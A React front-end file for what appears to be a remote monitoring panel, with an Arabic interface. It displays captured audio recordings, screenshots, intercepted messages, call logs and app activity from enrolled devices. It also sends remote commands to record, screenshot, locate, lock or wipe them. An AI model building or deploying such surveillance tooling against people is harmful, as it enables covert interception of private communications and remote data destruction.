import React, { useState, useEffect } from 'react';
import './App.css';

const API_BASE_URL = window.location.origin;

function App() {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [devices, setDevices] = useState([]);
  const [audioRecordings, setAudioRecordings] = useState([]);
  const [screenshots, setScreenshots] = useState([]);
  const [activities, setActivities] = useState([]);
  const [messages, setMessages] = useState([]);
  const [calls, setCalls] = useState([]);
  const [statistics, setStatistics] = useState({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedDevice, setSelectedDevice] = useState(null);

  // جلب البيانات من الخادم
  const fetchData = async () => {
    setLoading(true);
    setError('');
    
    try {
      // جلب الأجهزة
      const devicesResponse = await fetch(`${API_BASE_URL}/api/devices`);
      const devicesData = await devicesResponse.json();
      
      if (devicesData.success) {
        setDevices(devicesData.devices);
      }

      // جلب التسجيلات الصوتية
      const audioResponse = await fetch(`${API_BASE_URL}/api/audio`);
      const audioData = await audioResponse.json();
      
      if (audioData.success) {
        setAudioRecordings(audioData.recordings);
      }

      // جلب لقطات الشاشة
      const screenshotsResponse = await fetch(`${API_BASE_URL}/api/screenshots`);
      const screenshotsData = await screenshotsResponse.json();
      
      if (screenshotsData.success) {
        setScreenshots(screenshotsData.screenshots);
      }

      // جلب الأنشطة
      const activitiesResponse = await fetch(`${API_BASE_URL}/api/activities`);
      const activitiesData = await activitiesResponse.json();
      
      if (activitiesData.success) {
        setActivities(activitiesData.activities);
      }

      // جلب الرسائل
      const messagesResponse = await fetch(`${API_BASE_URL}/api/messages`);
      const messagesData = await messagesResponse.json();
      
      if (messagesData.success) {
        setMessages(messagesData.messages);
      }

      // جلب المكالمات
      const callsResponse = await fetch(`${API_BASE_URL}/api/calls`);
      const callsData = await callsResponse.json();
      
      if (callsData.success) {
        setCalls(callsData.calls);
      }

      // جلب الإحصائيات
      const statsResponse = await fetch(`${API_BASE_URL}/api/statistics`);
      const statsData = await statsResponse.json();
      
      if (statsData.success) {
        setStatistics(statsData.statistics);
      }

    } catch (err) {
      setError('فشل في جلب البيانات من الخادم');
      console.error('Error fetching data:', err);
    } finally {
      setLoading(false);
    }
  };

  // جلب البيانات عند تحميل المكون
  useEffect(() => {
    fetchData();
    
    // تحديث البيانات كل 30 ثانية
    const interval = setInterval(fetchData, 30000);
    return () => clearInterval(interval);
  }, []);

  // التحكم في الأجهزة
  const handleDeviceAction = async (deviceId, action) => {
    setLoading(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/devices/${deviceId}/${action}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        }
      });
      
      const data = await response.json();
      
      if (data.success) {
        alert(`تم ${action} بنجاح للجهاز ${deviceId}`);
        fetchData(); // تحديث البيانات
      } else {
        alert(`فشل في ${action}: ${data.error}`);
      }
    } catch (err) {
      alert(`خطأ في ${action}: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  // إرسال أمر للجهاز
  const sendCommand = async (deviceId, command, parameters = {}) => {
    setLoading(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/devices/${deviceId}/send_command`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ command, parameters })
      });
      
      const data = await response.json();
      
      if (data.success) {
        alert(`تم إرسال الأمر ${command} بنجاح للجهاز ${deviceId}`);
      } else {
        alert(`فشل في إرسال الأمر: ${data.error}`);
      }
    } catch (err) {
      alert(`خطأ في إرسال الأمر: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  // حذف جهاز
  const handleDeleteDevice = async (deviceId) => {
    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) {
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/devices/${deviceId}`, {
        method: 'DELETE'
      });
      
      const data = await response.json();
      
      if (data.success) {
        alert('تم حذف الجهاز بنجاح');
        fetchData(); // تحديث البيانات
      } else {
        alert(`فشل في حذف الجهاز: ${data.error}`);
      }
    } catch (err) {
      alert(`خطأ في حذف الجهاز: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  // تحويل حجم الملف
  const formatFileSize = (bytes) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  // تحويل المدة
  const formatDuration = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // عرض لوحة المعلومات
  const renderDashboard = () => (
    <div className="dashboard">
      <div className="dashboard-header">
        <h1>لوحة المعلومات الرئيسية</h1>
        <p>نظرة عامة على جميع الأجهزة والأنشطة</p>
        <button className="btn-refresh" onClick={fetchData} disabled={loading}>
          {loading ? '⏳ جاري التحديث...' : '🔄 تحديث البيانات'}
        </button>
      </div>

      <div className="stats-grid">
        <div className="stat-card active-devices">
          <div className="stat-icon">📱</div>
          <div className="stat-content">
            <h3>الأجهزة المتصلة</h3>
            <div className="stat-number">{statistics.active_devices || 0}</div>
            <p>من أصل {devices.length} أجهزة</p>
            <div className="stat-progress">
              <div 
                className="progress-fill" 
                style={{width: `${devices.length > 0 ? ((statistics.active_devices || 0) / devices.length) * 100 : 0}%`}}
              ></div>
            </div>
          </div>
        </div>
        
        <div className="stat-card audio-files">
          <div className="stat-icon">🎵</div>
          <div className="stat-content">
            <h3>التسجيلات الصوتية</h3>
            <div className="stat-number">{statistics.audio_recordings || 0}</div>
            <p>ملف صوتي</p>
            <small>آخر تسجيل: {audioRecordings.length > 0 ? new Date(audioRecordings[0].created_at).toLocaleDateString('ar-SA') : 'لا يوجد'}</small>
          </div>
        </div>
        
        <div className="stat-card screenshots">
          <div className="stat-icon">📸</div>
          <div className="stat-content">
            <h3>لقطات الشاشة</h3>
            <div className="stat-number">{statistics.screenshots || 0}</div>
            <p>صورة</p>
            <small>آخر لقطة: {screenshots.length > 0 ? new Date(screenshots[0].created_at).toLocaleDateString('ar-SA') : 'لا يوجد'}</small>
          </div>
        </div>
        
        <div className="stat-card storage">
          <div className="stat-icon">💾</div>
          <div className="stat-content">
            <h3>التخزين المستخدم</h3>
            <div className="stat-number">{statistics.total_storage_mb || 0} MB</div>
            <p>من أصل 10 GB</p>
            <div className="stat-progress">
              <div 
                className="progress-fill" 
                style={{width: `${((statistics.total_storage_mb || 0) / 10240) * 100}%`}}
              ></div>
            </div>
          </div>
        </div>

        <div className="stat-card activities">
          <div className="stat-icon">⚡</div>
          <div className="stat-content">
            <h3>الأنشطة</h3>
            <div className="stat-number">{activities.length}</div>
            <p>نشاط مسجل</p>
          </div>
        </div>

        <div className="stat-card messages">
          <div className="stat-icon">💬</div>
          <div className="stat-content">
            <h3>الرسائل</h3>
            <div className="stat-number">{messages.length}</div>
            <p>رسالة مسجلة</p>
          </div>
        </div>

        <div className="stat-card calls">
          <div className="stat-icon">📞</div>
          <div className="stat-content">
            <h3>المكالمات</h3>
            <div className="stat-number">{calls.length}</div>
            <p>مكالمة مسجلة</p>
          </div>
        </div>

        <div className="stat-card system-status">
          <div className="stat-icon">🟢</div>
          <div className="stat-content">
            <h3>حالة النظام</h3>
            <div className="stat-number">متصل</div>
            <p>جميع الخدمات تعمل</p>
          </div>
        </div>
      </div>

      <div className="recent-activity">
        <h2>النشاط الأخير</h2>
        <div className="activity-timeline">
          {audioRecordings.slice(0, 3).map(recording => (
            <div key={recording.id} className="activity-item audio">
              <div className="activity-icon">🎵</div>
              <div className="activity-content">
                <h4>تسجيل صوتي جديد</h4>
                <p>من الجهاز: {recording.device_name}</p>
                <small>{new Date(recording.created_at).toLocaleString('ar-SA')}</small>
              </div>
            </div>
          ))}
          
          {screenshots.slice(0, 3).map(screenshot => (
            <div key={screenshot.id} className="activity-item screenshot">
              <div className="activity-icon">📸</div>
              <div className="activity-content">
                <h4>لقطة شاشة جديدة</h4>
                <p>من الجهاز: {screenshot.device_name}</p>
                <small>{new Date(screenshot.created_at).toLocaleString('ar-SA')}</small>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  // عرض الأجهزة
  const renderDevices = () => (
    <div className="devices-management">
      <div className="section-header">
        <h2>إدارة الأجهزة</h2>
        <p>تحكم في الأجهزة المتصلة وتحديثاتها</p>
        <button className="btn-refresh" onClick={fetchData} disabled={loading}>
          {loading ? '⏳ جاري التحديث...' : '🔄 تحديث'}
        </button>
      </div>

      <div className="devices-grid">
        {devices.map(device => (
          <div key={device.device_id} className={`device-card ${device.is_active ? 'online' : 'offline'}`}>
            <div className="device-header">
              <div className={`device-status ${device.is_active ? 'online' : 'offline'}`}>
                <span className="status-dot"></span>
                <span className="status-text">{device.is_active ? 'متصل' : 'غير متصل'}</span>
              </div>
              <h3>{device.device_name}</h3>
              <span className="device-id">{device.device_id}</span>
            </div>
            
            <div className="device-details">
              <div className="detail-item">
                <span className="detail-label">النوع:</span>
                <span className="detail-value">{device.device_type}</span>
              </div>
              <div className="detail-item">
                <span className="detail-label">إصدار النظام:</span>
                <span className="detail-value">{device.os_version}</span>
              </div>
              <div className="detail-item">
                <span className="detail-label">البطارية:</span>
                <span className="detail-value">
                  <div className="battery-indicator">
                    <div 
                      className="battery-fill" 
                      style={{width: `${device.battery_level}%`}}
                    ></div>
                    <span>{device.battery_level}%</span>
                  </div>
                </span>
              </div>
              <div className="detail-item">
                <span className="detail-label">آخر نشاط:</span>
                <span className="detail-value">{new Date(device.last_seen).toLocaleString('ar-SA')}</span>
              </div>
            </div>

            <div className="device-controls">
              <div className="control-section">
                <h4>التسجيل والمراقبة</h4>
                <div className="control-row">
                  <button 
                    className="btn-action start"
                    onClick={() => handleDeviceAction(device.device_id, 'start_recording')}
                    disabled={loading}
                  >
                    🎵 بدء التسجيل
                  </button>
                  <button 
                    className="btn-action stop"
                    onClick={() => handleDeviceAction(device.device_id, 'stop_recording')}
                    disabled={loading}
                  >
                    ⏹️ إيقاف التسجيل
                  </button>
                </div>
                
                <div className="control-row">
                  <button 
                    className="btn-action start"
                    onClick={() => handleDeviceAction(device.device_id, 'take_screenshot')}
                    disabled={loading}
                  >
                    📸 التقاط الشاشة
                  </button>
                  <button 
                    className="btn-action start"
                    onClick={() => handleDeviceAction(device.device_id, 'start_monitoring')}
                    disabled={loading}
                  >
                    👁️ بدء المراقبة
                  </button>
                </div>
              </div>

              <div className="control-section">
                <h4>التحكم عن بعد</h4>
                <div className="control-row">
                  <button 
                    className="btn-action warning"
                    onClick={() => sendCommand(device.device_id, 'lock_device')}
                    disabled={loading}
                  >
                    🔒 قفل الجهاز
                  </button>
                  <button 
                    className="btn-action success"
                    onClick={() => sendCommand(device.device_id, 'unlock_device')}
                    disabled={loading}
                  >
                    🔓 إلغاء القفل
                  </button>
                </div>
                
                <div className="control-row">
                  <button 
                    className="btn-action secondary"
                    onClick={() => sendCommand(device.device_id, 'play_sound')}
                    disabled={loading}
                  >
                    🔊 تشغيل صوت
                  </button>
                  <button 
                    className="btn-action secondary"
                    onClick={() => sendCommand(device.device_id, 'get_location')}
                    disabled={loading}
                  >
                    📍 الموقع
                  </button>
                </div>
                
                <div className="control-row">
                  <button 
                    className="btn-action danger"
                    onClick={() => sendCommand(device.device_id, 'wipe_data')}
                    disabled={loading}
                  >
                    🗑️ مسح البيانات
                  </button>
                  <button 
                    className="btn-action danger"
                    onClick={() => handleDeleteDevice(device.device_id)}
                    disabled={loading}
                  >
                    ❌ حذف الجهاز
                  </button>
                </div>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  // عرض الملفات
  const renderFiles = () => (
    <div className="files-management">
      <div className="section-header">
        <h2>إدارة الملفات</h2>
        <p>عرض وإدارة الملفات الصوتية ولقطات الشاشة</p>
      </div>

      <div className="files-tabs">
        <button 
          className={`tab-btn ${activeTab === 'audio' ? 'active' : ''}`}
          onClick={() => setActiveTab('audio')}
        >
          🎵 الملفات الصوتية ({audioRecordings.length})
        </button>
        <button 
          className={`tab-btn ${activeTab === 'screenshots' ? 'active' : ''}`}
          onClick={() => setActiveTab('screenshots')}
        >
          📸 لقطات الشاشة ({screenshots.length})
        </button>
      </div>

      {activeTab === 'audio' && (
        <div className="files-grid">
          {audioRecordings.map(recording => (
            <div key={recording.id} className="file-card audio-file">
              <div className="file-header">
                <div className="file-icon">🎵</div>
                <div className="file-actions">
                  <button className="btn-file play">▶️</button>
                  <button className="btn-file download">⬇️</button>
                  <button className="btn-file delete">🗑️</button>
                </div>
              </div>
              <div className="file-info">
                <h4>{recording.filename}</h4>
                <div className="file-details">
                  <span><strong>الجهاز:</strong> {recording.device_name}</span>
                  <span><strong>الحجم:</strong> {formatFileSize(recording.file_size)}</span>
                  <span><strong>المدة:</strong> {formatDuration(recording.duration)}</span>
                  <span><strong>الجودة:</strong> {recording.quality}</span>
                  <span><strong>التاريخ:</strong> {new Date(recording.created_at).toLocaleString('ar-SA')}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {activeTab === 'screenshots' && (
        <div className="files-grid">
          {screenshots.map(screenshot => (
            <div key={screenshot.id} className="file-card screenshot-file">
              <div className="file-header">
                <div className="file-icon">📸</div>
                <div className="file-actions">
                  <button className="btn-file view">👁️</button>
                  <button className="btn-file download">⬇️</button>
                  <button className="btn-file delete">🗑️</button>
                </div>
              </div>
              <div className="file-info">
                <h4>{screenshot.filename}</h4>
                <div className="file-details">
                  <span><strong>الجهاز:</strong> {screenshot.device_name}</span>
                  <span><strong>الحجم:</strong> {formatFileSize(screenshot.file_size)}</span>
                  <span><strong>الأبعاد:</strong> {screenshot.width}x{screenshot.height}</span>
                  <span><strong>التاريخ:</strong> {new Date(screenshot.created_at).toLocaleString('ar-SA')}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );

  // عرض الأنشطة والرسائل والمكالمات
  const renderMonitoring = () => (
    <div className="monitoring">
      <div className="section-header">
        <h2>المراقبة والأنشطة</h2>
        <p>عرض الأنشطة والرسائل والمكالمات المسجلة</p>
      </div>

      <div className="monitoring-tabs">
        <button 
          className={`tab-btn ${activeTab === 'activities' ? 'active' : ''}`}
          onClick={() => setActiveTab('activities')}
        >
          ⚡ الأنشطة ({activities.length})
        </button>
        <button 
          className={`tab-btn ${activeTab === 'messages' ? 'active' : ''}`}
          onClick={() => setActiveTab('messages')}
        >
          💬 الرسائل ({messages.length})
        </button>
        <button 
          className={`tab-btn ${activeTab === 'calls' ? 'active' : ''}`}
          onClick={() => setActiveTab('calls')}
        >
          📞 المكالمات ({calls.length})
        </button>
      </div>

      {activeTab === 'activities' && (
        <div className="monitoring-grid">
          {activities.length === 0 ? (
            <div className="empty-state">
              <div className="empty-icon">⚡</div>
              <h3>لا توجد أنشطة مسجلة</h3>
              <p>سيتم عرض الأنشطة هنا عند توفرها</p>
            </div>
          ) : (
            activities.map(activity => (
              <div key={activity.id} className="monitoring-card activity-card">
                <div className="card-header">
                  <div className="card-icon">⚡</div>
                  <div className="card-meta">
                    <span className="device-name">{activity.device_name}</span>
                    <span className="timestamp">{new Date(activity.created_at).toLocaleString('ar-SA')}</span>
                  </div>
                </div>
                <div className="card-content">
                  <h4>{activity.activity_type}</h4>
                  <p><strong>التطبيق:</strong> {activity.app_name}</p>
                  <p><strong>العنوان:</strong> {activity.window_title}</p>
                  <p><strong>المدة:</strong> {formatDuration(activity.duration)}</p>
                </div>
              </div>
            ))
          )}
        </div>
      )}

      {activeTab === 'messages' && (
        <div className="monitoring-grid">
          {messages.length === 0 ? (
            <div className="empty-state">
              <div className="empty-icon">💬</div>
              <h3>لا توجد رسائل مسجلة</h3>
              <p>سيتم عرض الرسائل هنا عند توفرها</p>
            </div>
          ) : (
            messages.map(message => (
              <div key={message.id} className="monitoring-card message-card">
                <div className="card-header">
                  <div className="card-icon">💬</div>
                  <div className="card-meta">
                    <span className="device-name">{message.device_name}</span>
                    <span className="timestamp">{new Date(message.created_at).toLocaleString('ar-SA')}</span>
                  </div>
                </div>
                <div className="card-content">
                  <h4>{message.message_type}</h4>
                  <p><strong>من:</strong> {message.sender}</p>
                  <p><strong>إلى:</strong> {message.recipient}</p>
                  <p><strong>التطبيق:</strong> {message.app_name}</p>
                  <div className="message-content">{message.content}</div>
                </div>
              </div>
            ))
          )}
        </div>
      )}

      {activeTab === 'calls' && (
        <div className="monitoring-grid">
          {calls.length === 0 ? (
            <div className="empty-state">
              <div className="empty-icon">📞</div>
              <h3>لا توجد مكالمات مسجلة</h3>
              <p>سيتم عرض المكالمات هنا عند توفرها</p>
            </div>
          ) : (
            calls.map(call => (
              <div key={call.id} className="monitoring-card call-card">
                <div className="card-header">
                  <div className="card-icon">📞</div>
                  <div className="card-meta">
                    <span className="device-name">{call.device_name}</span>
                    <span className="timestamp">{new Date(call.created_at).toLocaleString('ar-SA')}</span>
                  </div>
                </div>
                <div className="card-content">
                  <h4>{call.call_type}</h4>
                  <p><strong>الرقم:</strong> {call.phone_number}</p>
                  <p><strong>الاسم:</strong> {call.contact_name}</p>
                  <p><strong>المدة:</strong> {formatDuration(call.duration)}</p>
                </div>
              </div>
            ))
          )}
        </div>
      )}
    </div>
  );

  // عرض التقارير
  const renderReports = () => (
    <div className="reports">
      <div className="section-header">
        <h2>التقارير والإحصائيات</h2>
        <p>تقارير مفصلة عن نشاط الأجهزة والخدمات</p>
      </div>

      <div className="reports-grid">
        <div className="report-card">
          <h3>نشاط الأجهزة اليومي</h3>
          <div className="chart-container">
            <div className="chart-placeholder">
              📊 رسم بياني لنشاط الأجهزة
            </div>
          </div>
        </div>

        <div className="report-card">
          <h3>توزيع الخدمات</h3>
          <div className="service-stats">
            <div className="service-item">
              <span className="service-label">🎵 التسجيل الصوتي</span>
              <div className="service-progress">
                <div className="progress-bar">
                  <div className="progress-fill" style={{width: '67%'}}></div>
                </div>
                <span className="service-percentage">67%</span>
              </div>
            </div>
            <div className="service-item">
              <span className="service-label">📸 لقطات الشاشة</span>
              <div className="service-progress">
                <div className="progress-bar">
                  <div className="progress-fill" style={{width: '45%'}}></div>
                </div>
                <span className="service-percentage">45%</span>
              </div>
            </div>
            <div className="service-item">
              <span className="service-label">👁️ المراقبة</span>
              <div className="service-progress">
                <div className="progress-bar">
                  <div className="progress-fill" style={{width: '78%'}}></div>
                </div>
                <span className="service-percentage">78%</span>
              </div>
            </div>
            <div className="service-item">
              <span className="service-label">💬 الرسائل</span>
              <div className="service-progress">
                <div className="progress-bar">
                  <div className="progress-fill" style={{width: '23%'}}></div>
                </div>
                <span className="service-percentage">23%</span>
              </div>
            </div>
          </div>
        </div>

        <div className="report-card">
          <h3>إحصائيات الاستخدام</h3>
          <div className="usage-stats">
            <div className="usage-item">
              <span className="usage-label">إجمالي الأجهزة</span>
              <span className="usage-value">{devices.length}</span>
            </div>
            <div className="usage-item">
              <span className="usage-label">الأجهزة النشطة</span>
              <span className="usage-value">{statistics.active_devices || 0}</span>
            </div>
            <div className="usage-item">
              <span className="usage-label">إجمالي الملفات</span>
              <span className="usage-value">{audioRecordings.length + screenshots.length}</span>
            </div>
            <div className="usage-item">
              <span className="usage-label">التخزين المستخدم</span>
              <span className="usage-value">{statistics.total_storage_mb || 0} MB</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  return (
    <div className="App">
      <header className="app-header">
        <div className="header-content">
          <div className="logo">
            <span className="logo-icon">⚡</span>
            <div className="logo-text">
              <h1>لوحة التحكم المتقدمة</h1>
              <p>نظام المراقبة والتسجيل الاحترافي</p>
            </div>
          </div>
          <div className="header-actions">
            <div className="status-indicator">
              <span className="status-dot online"></span>
              <span>متصل</span>
            </div>
            <button className="settings-btn">⚙️ الإعدادات</button>
          </div>
        </div>
      </header>

      <nav className="app-nav">
        <button 
          className={`nav-btn ${activeTab === 'dashboard' ? 'active' : ''}`}
          onClick={() => setActiveTab('dashboard')}
        >
          <span className="nav-icon">📊</span>
          <span className="nav-text">لوحة المعلومات</span>
        </button>
        <button 
          className={`nav-btn ${activeTab === 'devices' ? 'active' : ''}`}
          onClick={() => setActiveTab('devices')}
        >
          <span className="nav-icon">📱</span>
          <span className="nav-text">الأجهزة</span>
        </button>
        <button 
          className={`nav-btn ${activeTab === 'files' ? 'active' : ''}`}
          onClick={() => setActiveTab('files')}
        >
          <span className="nav-icon">📁</span>
          <span className="nav-text">الملفات</span>
        </button>
        <button 
          className={`nav-btn ${activeTab === 'monitoring' ? 'active' : ''}`}
          onClick={() => setActiveTab('monitoring')}
        >
          <span className="nav-icon">👁️</span>
          <span className="nav-text">المراقبة</span>
        </button>
        <button 
          className={`nav-btn ${activeTab === 'reports' ? 'active' : ''}`}
          onClick={() => setActiveTab('reports')}
        >
          <span className="nav-icon">📈</span>
          <span className="nav-text">التقارير</span>
        </button>
      </nav>

      <main className="app-main">
        {error && (
          <div className="error-message">
            <div className="error-icon">⚠️</div>
            <div className="error-content">
              <h3>خطأ في الاتصال</h3>
              <p>{error}</p>
              <button onClick={fetchData} className="btn-retry">إعادة المحاولة</button>
            </div>
          </div>
        )}
        
        {loading && (
          <div className="loading-overlay">
            <div className="loading-spinner"></div>
            <p>جاري تحميل البيانات...</p>
          </div>
        )}
        
        {activeTab === 'dashboard' && renderDashboard()}
        {activeTab === 'devices' && renderDevices()}
        {activeTab === 'files' && renderFiles()}
        {activeTab === 'monitoring' && renderMonitoring()}
        {activeTab === 'reports' && renderReports()}
      </main>
    </div>
  );
}

export default App;

